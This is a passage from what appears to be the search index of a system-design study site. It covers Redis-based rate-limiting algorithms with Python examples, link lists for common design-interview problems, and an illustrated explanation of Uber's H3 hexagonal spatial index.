__init__(self, window_size, max_requests, redis_client, key):\n        self.window_size = window_size  # in seconds\n        self.max_requests = max_requests\n        self.redis = redis_client\n        self.key = key\n\n    def allow_request(self):\n        \"\"\"Check if request is allowed in current window\"\"\"\n        now = time.time()\n        window_key = f\"{self.key}:{math.floor(now / self.window_size)}\"\n\n        # Increment counter\n        current_count = self.redis.incr(window_key)\n\n        # Set expiration on first request in window\n        if current_count == 1:\n            self.redis.expire(window_key, self.window_size * 2)\n\n        # Check limit\n        if current_count &lt;= self.max_requests:\n            return True\n\n        return False\n\n# Usage\nredis_client = redis.Redis(host='localhost', port=6379)\nlimiter = FixedWindowCounter(window_size=60, max_requests=100, \n                             redis_client=redis_client, key=\"user:123\")\n\nif limiter.allow_request():\n    print(\"Request allowed\")\nelse:\n    print(\"Window limit exceeded - 429\")\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#4-sliding-window-log-algorithm","title":"4. Sliding Window Log Algorithm","text":""},{"location":"system-design/high-level/desgining/rate-limiter/#description_3","title":"Description","text":"<p>The Sliding Window Log algorithm keeps a log (sorted set) of timestamps for all requests. When a new request arrives, it removes all timestamps older than the current time minus the window size, then counts the remaining timestamps. If the count is below the limit, the request is allowed and its timestamp is added to the log.</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#diagram_3","title":"Diagram","text":"<pre><code>Window Size: 60s\nCurrent Time: 100s\nLook back to: 40s\n\nTimeline:\n35s  42s  55s  58s  70s  85s  95s  [100s - NEW REQUEST]\n X    \u2713    \u2713    \u2713    \u2713    \u2713    \u2713\n(old) \u2190 Sliding Window (60s) \u2192\n\nCount in window: 6\nIf limit = 10: Allow request\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#advantages_3","title":"Advantages","text":"<ul> <li>Very accurate - no boundary issues</li> <li>True sliding window (not fixed intervals)</li> <li>Precise rate limiting</li> <li>Fair distribution of requests</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#disadvantages_3","title":"Disadvantages","text":"<ul> <li>Memory intensive - stores timestamp for every request</li> <li>Expensive for high traffic (needs to scan and clean logs)</li> <li>Requires more storage (grows with traffic)</li> <li>Slower than counter-based approaches</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#implementation_3","title":"Implementation","text":"<p>Storage: Redis Sorted Set (ZSET) with timestamps as scores</p> <p>Configuration Parameters: - <code>window_size</code>: Duration in seconds (e.g., 60) - <code>max_requests</code>: Maximum requests per window (e.g., 100)</p> <p>Ease of Implementation: \u2b50\u2b50\u2b50 (3/5) - Moderate complexity</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#code-example_3","title":"Code Example","text":"<pre><code>import time\nimport redis\n\nclass SlidingWindowLog:\n    def __init__(self, window_size, max_requests, redis_client, key):\n        self.window_size = window_size  # in seconds\n        self.max_requests = max_requests\n        self.redis = redis_client\n        self.key = f\"{key}:log\"\n\n    def allow_request(self):\n        \"\"\"Check if request is allowed using sliding window\"\"\"\n        now = time.time()\n        window_start = now - self.window_size\n\n        # Use pipeline for atomic operations\n        pipe = self.redis.pipeline()\n\n        # Remove old entries outside the window\n        pipe.zremrangebyscore(self.key, 0, window_start)\n\n        # Count requests in current window\n        pipe.zcard(self.key)\n\n        # Execute pipeline\n        _, current_count = pipe.execute()\n\n        # Check limit\n        if current_count &lt; self.max_requests:\n            # Add current request timestamp\n            self.redis.zadd(self.key, {now: now})\n            self.redis.expire(self.key, self.window_size * 2)\n            return True\n\n        return False\n\n# Usage\nredis_client = redis.Redis(host='localhost', port=6379)\nlimiter = SlidingWindowLog(window_size=60, max_requests=100, \n                          redis_client=redis_client, key=\"user:123\")\n\nif limiter.allow_request():\n    print(\"Request allowed\")\nelse:\n    print(\"Rate limit exceeded - 429\")\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#5-sliding-window-counter-algorithm","title":"5. Sliding Window Counter Algorithm","text":""},{"location":"system-design/high-level/desgining/rate-limiter/#description_4","title":"Description","text":"<p>The Sliding Window Counter is a hybrid approach that combines Fixed Window Counter and Sliding Window Log. It uses two fixed windows (current and previous) and calculates an approximate count based on the overlap. This provides better accuracy than Fixed Window Counter with lower memory usage than Sliding Window Log.</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#diagram_4","title":"Diagram","text":"<pre><code>Previous Window    Current Window\n    (0-60s)           (60-120s)\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 80   \u2502          \u2502 40   \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCurrent Time: 90s (30s into current window)\n\nFormula:\nEstimated Count = (Previous \u00d7 Overlap%) + Current\n                = (80 \u00d7 50%) + 40\n                = 40 + 40 = 80\n\nIf limit = 100: Allow request\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#advantages_4","title":"Advantages","text":"<ul> <li>Good balance between accuracy and memory</li> <li>Better than Fixed Window (smoother)</li> <li>More memory efficient than Sliding Window Log</li> <li>Handles boundary issues well</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#disadvantages_4","title":"Disadvantages","text":"<ul> <li>Only an approximation (not 100% accurate)</li> <li>Slightly more complex than Fixed Window</li> <li>Assumes uniform distribution in previous window</li> <li>Still has minor edge cases</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#implementation_4","title":"Implementation","text":"<p>Storage: Redis with two counters</p> <p>Configuration Parameters: - <code>window_size</code>: Duration in seconds (e.g., 60) - <code>max_requests</code>: Maximum requests per window (e.g., 100)</p> <p>Ease of Implementation: \u2b50\u2b50\u2b50\u2b50 (4/5) - Moderately easy</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#code-example_4","title":"Code Example","text":"<pre><code>import time\nimport redis\nimport math\n\nclass SlidingWindowCounter:\n    def __init__(self, window_size, max_requests, redis_client, key):\n        self.window_size = window_size  # in seconds\n        self.max_requests = max_requests\n        self.redis = redis_client\n        self.key = key\n\n    def allow_request(self):\n        \"\"\"Check if request is allowed using sliding window counter\"\"\"\n        now = time.time()\n        current_window = math.floor(now / self.window_size)\n        previous_window = current_window - 1\n\n        # Calculate time elapsed in current window\n        elapsed_time_in_current = now - (current_window * self.window_size)\n        overlap_percentage = 1 - (elapsed_time_in_current / self.window_size)\n\n        # Get counters\n        prev_key = f\"{self.key}:{previous_window}\"\n        curr_key = f\"{self.key}:{current_window}\"\n\n        prev_count = int(self.redis.get(prev_key) or 0)\n        curr_count = int(self.redis.get(curr_key) or 0)\n\n        # Calculate estimated count\n        estimated_count = (prev_count * overlap_percentage) + curr_count\n\n        # Check limit\n        if estimated_count &lt; self.max_requests:\n            # Increment current window counter\n            pipe = self.redis.pipeline()\n            pipe.incr(curr_key)\n            pipe.expire(curr_key, self.window_size * 2)\n            pipe.execute()\n            return True\n\n        return False\n\n# Usage\nredis_client = redis.Redis(host='localhost', port=6379)\nlimiter = SlidingWindowCounter(window_size=60, max_requests=100, \n                               redis_client=redis_client, key=\"user:123\")\n\nif limiter.allow_request():\n    print(\"Request allowed\")\nelse:\n    print(\"Rate limit exceeded - 429\")\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#comparison-table","title":"Comparison Table","text":"Algorithm Accuracy Memory Performance Allows Bursts Complexity Token Bucket Good Low High Yes Easy Leaky Bucket Excellent Medium Medium No Moderate Fixed Window Poor Very Low Very High Yes Very Easy Sliding Window Log Excellent High Low No Moderate Sliding Window Counter Good Low High Partial Easy"},{"location":"system-design/high-level/desgining/rate-limiter/#redis-vs-configuration","title":"Redis vs Configuration","text":""},{"location":"system-design/high-level/desgining/rate-limiter/#when-to-use-redis","title":"When to use Redis:","text":"<ul> <li>Distributed systems (multiple servers need shared state)</li> <li>High traffic scenarios</li> <li>Dynamic rate limits that change frequently</li> <li>Per-user/per-IP rate limiting</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#when-to-use-in-memoryconfig","title":"When to use In-Memory/Config:","text":"<ul> <li>Single server applications</li> <li>Low traffic scenarios</li> <li>Static rate limits that rarely change</li> <li>Global rate limiting (same for all users)</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#hybrid-approach","title":"Hybrid Approach:","text":"<pre><code># Config file (config.yaml)\nrate_limits:\n  api_v1: 100 requests per minute\n  api_v2: 1000 requests per minute\n\n# Redis stores the actual counters/state\n# Config stores the limits/rules\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#which-algorithm-to-choose","title":"Which Algorithm to Choose?","text":"<ul> <li>Token Bucket: Best for most use cases, especially APIs (used by Amazon, Stripe)</li> <li>Leaky Bucket: When you need smooth, consistent output rate</li> <li>Fixed Window: Simple caching, non-critical rate limiting</li> <li>Sliding Window Log: When accuracy is critical and memory is not a concern</li> <li>Sliding Window Counter: Good balance for high-traffic systems (used by Cloudflare)</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#return-http-status-code","title":"Return HTTP Status Code","text":"<p>When rate limit is exceeded, return: <pre><code>HTTP/1.1 429 Too Many Requests\nX-RateLimit-Limit: 100\nX-RateLimit-Remaining: 0\nX-RateLimit-Reset: 1640000000\nRetry-After: 60\n\n{\n  \"error\": \"Rate limit exceeded\",\n  \"message\": \"Too many requests. Please try again later.\"\n}\n</code></pre></p>"},{"location":"system-design/high-level/desgining/recomendation-engine/","title":"Design a Recommendation System","text":""},{"location":"system-design/high-level/desgining/recomendation-engine/#youtube","title":"Youtube","text":"<ul> <li>Design an ML Recommendation Engine | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/redis/","title":"Build Your Own Redis","text":""},{"location":"system-design/high-level/desgining/redis/#youtube","title":"Youtube","text":"<ul> <li>Build Your Own Redis</li> </ul>"},{"location":"system-design/high-level/desgining/search-engine/","title":"Design Search Engine (Google)","text":""},{"location":"system-design/high-level/desgining/search-engine/#youtube","title":"Youtube","text":"<ul> <li>Design a Basic Search Engine (Google or Bing) | System Design Interview Prep</li> </ul>"},{"location":"system-design/high-level/desgining/social-media/","title":"Design Social Media","text":""},{"location":"system-design/high-level/desgining/social-media/#youtube","title":"Youtube","text":"<ul> <li>Design a Low-Latency Social Media Platform | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/spotify/","title":"Design Spotify","text":""},{"location":"system-design/high-level/desgining/spotify/#youtube","title":"Youtube","text":"<ul> <li>System Design Interview: Design Spotify</li> </ul>"},{"location":"system-design/high-level/desgining/stock-broker-system/","title":"Stock Broker System(Zerodha)","text":""},{"location":"system-design/high-level/desgining/stock-broker-system/#youtube","title":"Youtube","text":"<ul> <li>Stock Trading App System Design Interview | Meta System Design</li> <li>Zerodha Stock Broker System Design with @KeertiPurswani</li> <li>Zerodha Stock Broker System Design (in Hindi)</li> <li>System Design 12: Design Stock Broker Trading Application like Zerodha | Grow | Upstox | HLD | LLD</li> <li>Machine Coding Interview Round | Design and Code Zerodha like Stock Broker App LIVE-Low Level Design</li> <li>Designing Zerodha | Mock Interview | Shreyansh Goyal | System Design #Zerodha | SG OG Ep 1</li> <li>I coded Zerodha's Trading Algorithm in 1 hour</li> </ul>"},{"location":"system-design/high-level/desgining/stock-broker-system/#others","title":"Others","text":"<ul> <li>Building &amp; Deploying an Order Book for Stock Exchanges</li> </ul>"},{"location":"system-design/high-level/desgining/tiny-url/","title":"Design Tiny Url","text":""},{"location":"system-design/high-level/desgining/tiny-url/#youtube","title":"Youtube","text":""},{"location":"system-design/high-level/desgining/tiny-url/#website","title":"Website","text":"<ul> <li> <p>Tiny URL (URL Shortener)</p> </li> <li> <p>7. Design URL Shortening Service like TinyURL | Design URL Shortener | System design interview quest</p> </li> </ul>"},{"location":"system-design/high-level/desgining/twitter/","title":"Design Twitter","text":""},{"location":"system-design/high-level/desgining/twitter/#youtube","title":"Youtube","text":"<ul> <li>System Design for Twitter (Timeline, Live Updates, Tweeting) | System Design Interview Prep</li> </ul>"},{"location":"system-design/high-level/desgining/uber/","title":"Design Uber","text":""},{"location":"system-design/high-level/desgining/uber/#youtube","title":"Youtube","text":"<ul> <li>System Design Interview: Design Uber w/ a Google Engineer</li> <li>Basic System Design for Uber or Lyft | System Design Interview Prep</li> <li>The Genius System Behind the Uber App's Real-Time Map</li> </ul>"},{"location":"system-design/high-level/desgining/uber/#blogs","title":"Blogs","text":"<ul> <li>Employing QUIC Protocol to Optimize Uber's App Performance</li> <li>Uber's Next Gen Push Platform on gRPC</li> <li>QUIC protocol in action: how Uber implemented it to optimize performance</li> <li>Reader's Digest: Employing QUIC Protocol to Optimize Uber's App Performance</li> </ul>"},{"location":"system-design/high-level/desgining/uber/#theory","title":"Theory","text":""},{"location":"system-design/high-level/desgining/uber/#h3-spatial-index","title":"H3 Spatial Index","text":""},{"location":"system-design/high-level/desgining/uber/#what-is-h3","title":"What is H3?","text":"<p>H3 is a geospatial indexing system developed by Uber that divides the world into a hierarchical grid of hexagonal cells. Each hexagon has a unique identifier, making it easy to perform spatial operations, proximity searches, and geographical analytics at scale.</p> <p>Key Features: - Hierarchical hexagonal grid (16 resolution levels: 0-15) - Global coverage from continent to meter scale - Compact 64-bit integer index - Efficient nearest neighbor searches - Uniform cell distribution</p> <p>Open Source: Released by Uber in 2018 under Apache 2.0 license</p>"},{"location":"system-design/high-level/desgining/uber/#why-hexagons-vs-squares-or-triangles","title":"Why Hexagons? (vs Squares or Triangles)","text":""},{"location":"system-design/high-level/desgining/uber/#comparison-of-grid-shapes","title":"Comparison of Grid Shapes","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                     SQUARES (Traditional)                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  \u250c\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2510                                                  \u2502\n\u2502  \u2502 A \u2502 B \u2502 C \u2502     Problems:                                    \u2502\n\u2502  \u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2524     \u2022 Different distances to neighbors           \u2502\n\u2502  \u2502 D \u2502 X \u2502 E \u2502     \u2022 Edge neighbor: 1 unit away                \u2502\n\u2502  \u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2524     \u2022 Corner neighbor: \u221a2 = 1.414 units away    \u2502\n\u2502  \u2502 F \u2502 G \u2502 H \u2502     \u2022 Non-uniform spatial analysis              \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2518     \u2022 Anisotropic (direction-dependent)         \u2502\n\u2502                                                                  \u2502\n\u2502  Distance from X to:                                            \u2502\n\u2502  B, D, E, G (edges)  = 1.0 units                                \u2502\n\u2502  A, C, F, H (corners) = 1.414 units (41% farther!)             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                     TRIANGLES (Alternative)                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502     /\\  /\\  /\\                                                   \u2502\n\u2502    /A \\/B \\/C \\     Problems:                                    \u2502\n\u2502   /\\  /\\X /\\  /     \u2022 Different neighbor counts (3 vs 12)       \u2502\n\u2502  /D \\/E \\/F \\/      \u2022 Orientation matters (up vs down)          \u2502\n\u2502  \\  /\\  /\\  /       \u2022 Complex distance calculations             \u2502\n\u2502   \\/G \\/H \\/        \u2022 Harder to implement                       \u2502\n\u2502                     \u2022 3 neighbors vs 12 second-order neighbors  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                     HEXAGONS (H3 Choice) \u2705                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502      ___       ___       ___                                     \u2502\n\u2502     /   \\     /   \\     /   \\                                    \u2502\n\u2502    / A   \\___/ B   \\___/ C   \\    Advantages:                   \u2502\n\u2502    \\     /   \\     /   \\     /    \u2705 Equal distance to all 6    \u2502\n\u2502     \\___/ D  X\\___/ E   \\___/        neighbors                  \u2502\n\u2502     /   \\     /   \\     /   \\     \u2705 Uniform spatial coverage   \u2502\n\u2502    / F   \\___/ G   \\___/ H   \\    \u2705 Isotropic (no direction    \u2502\n\u2502    \\     /   \\     /   \\     /       bias)                      \u2502\n\u2502     \\___/     \\___/     \\___/      \u2705 Efficient packing         \u2502\n\u2502                                     \u2705 Natural for proximity    \u2502\n\u2502  Distance from X to all neighbors:    queries                   \u2502\n\u2502  A, B, D, E, G, H (all 6) = 1.0 units (uniform!)               \u2502\n\u2502                                                                  \u2502\n\u2502  Closest packing to circles (nature's choice: honeycombs!)     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#why-hexagons-win","title":"Why Hexagons Win:","text":"Feature Squares Triangles Hexagons Neighbor Distance Non-uniform (1 vs 1.41) Non-uniform \u2705 Uniform Neighbor Count 8 (4 edge + 4 corner) 3 or 12 6 (all equal) Quantization Error High Medium \u2705 Lowest Proximity Analysis Biased Complex \u2705 Natural Circle Approximation Poor Poor \u2705 Best Implementation Easy Hard Medium Isotropy \u274c No \u274c No \u2705 Yes"},{"location":"system-design/high-level/desgining/uber/#h3-hierarchical-structure","title":"H3 Hierarchical Structure","text":"<p>H3 has 16 resolution levels (0-15), from very coarse (continent-sized) to very fine (meter-scale).</p>"},{"location":"system-design/high-level/desgining/uber/#resolution-levels","title":"Resolution Levels","text":"<pre><code>Resolution    Avg Hexagon Edge    Avg Hexagon Area    Use Case\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n    0           1,107 km           4,357,449 km\u00b2      Earth regions\n    1             418 km             609,788 km\u00b2      Continents\n    2             158 km              86,801 km\u00b2      Large countries\n    3              59 km              12,393 km\u00b2      States/Provinces\n    4              22 km               1,770 km\u00b2      Counties\n    5             8.5 km                 252 km\u00b2      Cities\n    6             3.2 km                  36 km\u00b2      Municipalities\n    7             1.2 km                 5.2 km\u00b2      Neighborhoods\n    8             461 m                  0.74 km\u00b2     Districts\n    9             174 m                  0.11 km\u00b2     City blocks\n   10              66 m                 15,047 m\u00b2     Large buildings\n   11              25 m                  2,149 m\u00b2     Buildings\n   12             9.4 m                    307 m\u00b2     Houses\n   13             3.5 m                     44 m\u00b2     Rooms\n   14             1.3 m                    6.3 m\u00b2     Parking spots\n   15             0.5 m                    0.9 m\u00b2     Precise location\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#hierarchical-containment","title":"Hierarchical Containment","text":"<p>Each parent hexagon contains approximately 7 child hexagons at the next resolution.</p> <pre><code>                    Resolution 0 (Continent)\n                         ___________\n                        /           \\\n                       /   Parent    \\\n                      /    (Res 0)    \\\n                      \\               /\n                       \\   4,357,449  /\n                        \\    km\u00b2     /\n                         \\_________/\n                              |\n                ______________|_______________\n               |              |               |\n               \u25bc              \u25bc               \u25bc\n         Resolution 1    Resolution 1    Resolution 1\n          ________         ________         ________\n         /        \\       /        \\       /        \\\n        /  Child   \\     /  Child   \\     /  Child   \\\n       /  (Res 1)  \\   /  (Res 1)  \\   /  (Res 1)  \\\n       \\           /   \\           /   \\           /\n        \\ 609,788  /     \\ 609,788  /     \\ 609,788  /\n         \\  km\u00b2   /       \\  km\u00b2   /       \\  km\u00b2   /\n          \\______/         \\______/         \\______/\n              |\n         _____|_____\n        |     |     |\n        \u25bc     \u25bc     \u25bc\n      Res 2  Res 2  Res 2\n       ...    ...    ...\n\nParent-Child Ratio: 1 parent \u2248 7 children (varies slightly)\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#visual-hierarchy-example","title":"Visual Hierarchy Example","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502            Resolution 3 (State level - 59 km edge)          \u2502\n\u2502   ___________                                               \u2502\n\u2502  /           \\                                              \u2502\n\u2502 /             \\                                             \u2502\n\u2502/   California  \\                                            \u2502\n\u2502\\               /                                            \u2502\n\u2502 \\             /                                             \u2502\n\u2502  \\___________/                                              \u2502\n\u2502       |                                                      \u2502\n\u2502       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                               \u2502\n\u2502                              \u25bc                               \u2502\n\u2502         Resolution 5 (City level - 8.5 km edge)            \u2502\n\u2502         ___     ___     ___     ___                         \u2502\n\u2502        /   \\   /   \\   /   \\   /   \\                        \u2502\n\u2502       / SF  \\_/ SF  \\_/ SF  \\_/ SF  \\                       \u2502\n\u2502       \\     /  \\     /  \\     /  \\     /                    \u2502\n\u2502        \\___/ SF \\___/ SF \\___/ SF \\___/                     \u2502\n\u2502        /   \\     /   \\     /   \\     /                      \u2502\n\u2502       / SF  \\___/ SF  \\___/ SF  \\___/                       \u2502\n\u2502       \\     /   \\     /   \\     /                           \u2502\n\u2502        \\___/     \\___/     \\___/                            \u2502\n\u2502              |                                               \u2502\n\u2502              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                               \u2502\n\u2502                              \u25bc                               \u2502\n\u2502    Resolution 9 (Block level - 174 m edge)                 \u2502\n\u2502     ___     ___     ___     ___     ___     ___             \u2502\n\u2502    /   \\   /   \\   /   \\   /   \\   /   \\   /   \\            \u2502\n\u2502   /Block\\_/Block\\_/Block\\_/Block\\_/Block\\_/Block\\           \u2502\n\u2502   \\     /  \\     /  \\     /  \\     /  \\     /  \\     /      \u2502\n\u2502    \\___/    \\___/    \\___/    \\___/    \\___/    \\___/       \u2502\n\u2502    /   \\    /   \\    /   \\    /   \\    /   \\    /   \\       \u2502\n\u2502   /Block\\__/Block\\__/Block\\__/Block\\__/Block\\__/Block\\      \u2502\n\u2502   \\     /  \\     /  \\     /  \\     /  \\     /  \\     /      \u2502\n\u2502    \\___/    \\___/    \\___/    \\___/    \\___/    \\___/       \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#h3-index-structure","title":"H3 Index Structure","text":"<p>Each H3 cell has a unique 64-bit integer identifier that encodes its location and resolution.</p>"},{"location":"system-design/high-level/desgining/uber/#h3-index-bit-layout","title":"H3 Index Bit Layout","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    64-bit H3 Index Format                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Bits \u2502  Range  \u2502   Name   \u2502         Description                 